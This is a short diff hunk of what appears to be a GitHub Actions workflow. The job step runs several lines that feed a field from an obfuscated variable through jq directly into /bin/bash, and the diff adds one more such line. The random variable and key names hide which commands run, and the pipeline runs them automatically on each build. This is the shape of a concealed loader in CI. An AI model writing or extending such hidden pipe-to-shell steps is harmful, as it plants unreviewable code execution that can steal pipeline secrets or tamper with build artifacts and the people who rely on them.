@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$org1" | jq -r .hftyl2532 | /bin/bash
           echo $kxxjf4 | jq -r .k017 | /bin/bash
           printf '%s' "$fzoge3" | jq -r .igfas9 | /bin/bash
+          printf '%s' "$m974" | jq -r .ddon4 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
